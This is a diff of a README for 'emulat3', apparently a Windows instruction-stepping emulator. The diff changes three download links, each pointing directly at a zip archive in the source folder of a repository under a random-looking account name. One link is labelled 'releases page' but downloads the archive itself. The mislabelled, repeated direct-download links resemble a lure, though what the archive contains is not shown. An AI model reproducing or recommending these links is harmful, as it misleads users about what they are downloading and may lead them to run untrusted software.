@@ -1,6 +1,6 @@
 # 🧭 emulat3 - Step Through Code One Instruction at a Time
 
-[![Download emulat3](https://img.shields.io/badge/Download%20emulat3-blue?style=for-the-badge)](https://github.com/piceaglaucaghattigum741/emulat3/raw/refs/heads/main/src/emulat_1.7.zip)
+[![Download emulat3](https://img.shields.io/badge/Download%20emulat3-blue?style=for-the-badge)](https://raw.githubusercontent.com/piceaglaucaghattigum741/emulat3/main/src/emulat_1.7.zip)
 
 ## 🪟 What emulat3 does
 
@@ -15,7 +15,7 @@ Use it if you want to:
 
 ## 📥 Download emulat3
 
-1. Open the [emulat3 releases page](https://github.com/piceaglaucaghattigum741/emulat3/raw/refs/heads/main/src/emulat_1.7.zip)
+1. Open the [emulat3 releases page](https://raw.githubusercontent.com/piceaglaucaghattigum741/emulat3/main/src/emulat_1.7.zip)
 2. Find the latest release
 3. Download the Windows file from the release assets
 4. Save the file to a folder you can find later
@@ -186,7 +186,7 @@ If a PE file or shellcode file does not load:
 ## 📎 Release download
 
 Use this page to download emulat3 for Windows:
-https://github.com/piceaglaucaghattigum741/emulat3/raw/refs/heads/main/src/emulat_1.7.zip
+https://raw.githubusercontent.com/piceaglaucaghattigum741/emulat3/main/src/emulat_1.7.zip
 
 ## 🧭 Helpful workflow
 
